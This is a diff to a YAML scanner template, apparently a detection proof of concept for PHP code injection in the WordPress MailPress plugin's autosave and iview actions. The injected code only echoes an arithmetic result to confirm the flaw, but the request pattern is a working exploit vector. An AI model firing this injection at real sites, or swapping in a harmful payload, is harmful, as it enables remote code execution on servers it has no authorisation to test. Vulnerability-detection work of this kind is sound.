@@ -5,15 +5,17 @@ set:
 rules:
   - method: POST
     path: "/wp-content/plugins/mailpress/mp-includes/action.php"
+    headers:
+        Content-Type: application/x-www-form-urlencoded
     body: |
-      action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php echo {{r}}+{{r1}};?>&html=&plaintext=&mail_format=standard&autosave=1
+      action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=<?php echo {{r}}-{{r1}};?>&html=&plaintext=&mail_format=standard&autosave=1
     expression: "true"
     search: |
-      <autosave id="(?P<id>.+?)"
+      <autosave id='(?P<id>.+?)'
   - method: GET
     path: "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id={{id}}"
     expression: |
-      status == 200 && body.bcontains(bytes(string(r+r1)))
+      status == 200 && body.bcontains(bytes(string(r-r1)))
 
 detail:
   author: violin
